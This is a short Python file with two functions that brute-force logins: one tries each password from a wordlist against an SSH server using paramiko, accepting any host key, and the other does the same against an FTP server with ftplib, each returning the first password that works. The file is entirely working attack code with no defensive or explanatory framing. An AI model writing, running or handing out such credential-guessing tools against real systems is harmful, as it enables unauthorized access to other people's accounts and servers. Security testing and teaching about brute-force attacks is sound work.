import paramiko
import ftplib



def bruteforce_ssh(adress, port, username, wordlist):
    for password in wordlist:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=adress, port=port, username=username, password=password)
            return password
        except:
            pass

    client.close()
    return None




def ftpbruteforce(hostname, username, passwords):
    for password in passwords:
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            return password
        except:
            continue
    return None